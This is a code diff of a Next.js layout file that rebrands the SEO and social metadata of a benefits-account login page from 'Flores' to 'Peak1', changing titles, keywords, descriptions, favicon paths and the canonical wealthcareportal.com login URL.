@@ -7,22 +7,22 @@ import "./globals.css";
 const geist = Geist({ subsets: ["latin"] });
 
 const CANONICAL_LOGIN_URL =
-  "https://flores247.wealthcareportal.com/Authentication/Handshake";
-const SITE_DOMAIN = "flores247.wealthcareportal.com";
-const SITE_BRAND = "Flores";
+  "https://peak1.wealthcareportal.com/Authentication/Handshake";
+const SITE_DOMAIN = "peak1.wealthcareportal.com";
+const SITE_BRAND = "Peak1";
 
 export const metadata: Metadata = {
   metadataBase: new URL(
     process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
   ),
   title: {
-    default: "Flores - Login",
-    template: "%s | Flores",
+    default: "Peak1 - Login",
+    template: "%s | Peak1",
   },
   keywords: [
-    "Flores",
-    "Flores247",
-    "flores247.wealthcareportal.com",
+    "Peak1",
+    "peak1",
+    "peak1.wealthcareportal.com",
     "benefits login",
     "employee benefits portal",
     "FSA login",
@@ -35,13 +35,13 @@ export const metadata: Metadata = {
     "secure login",
     "participant portal",
     "employer portal",
-    "handshake authentication"
+    "handshake authentication",
   ],
-  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Flores.`,
+  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Peak1.`,
 
-  authors: [{ name: "Flores" }],
-  creator: "Flores",
-  publisher: "Flores",
+  authors: [{ name: "Peak1" }],
+  creator: "Peak1",
+  publisher: "Peak1",
   applicationName: SITE_BRAND,
   referrer: "origin-when-cross-origin",
   robots: {
@@ -58,8 +58,8 @@ export const metadata: Metadata = {
   openGraph: {
     type: "website",
     locale: "en_US",
-    title: "Flores - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Flores.`,
+    title: "Peak1 - Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Peak1.`,
     siteName: SITE_BRAND,
     url: CANONICAL_LOGIN_URL,
     images: [
@@ -73,14 +73,14 @@ export const metadata: Metadata = {
   },
   twitter: {
     card: "summary",
-    title: "Flores - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Flores.`,
+    title: "Peak1 - Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Peak1.`,
     images: ["/favicon-32x32.png"],
   },
   icons: {
-    icon: "/favicon-32x32.png",
-    shortcut: "/favicon-32x32.png",
-    apple: "/favicon-32x32.png",
+    icon: "/favicon.ico",
+    shortcut: "/favicon.ico",
+    apple: "/favicon.ico",
   },
   viewport: {
     width: "device-width",
@@ -106,10 +106,10 @@ const jsonLd = {
   name: SITE_BRAND,
   url: CANONICAL_LOGIN_URL,
   description:
-    "YourFlex Accounts sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your YourFlex Accounts profile.",
+    "Peak1 sign in portal. Log in to manage your health and dependent care benefits and access your Peak1 profile.",
   publisher: {
     "@type": "Organization",
-    name: "YourFlex Accounts",
+    name: SITE_BRAND,
   },
   inLanguage: "en-US",
   potentialAction: {
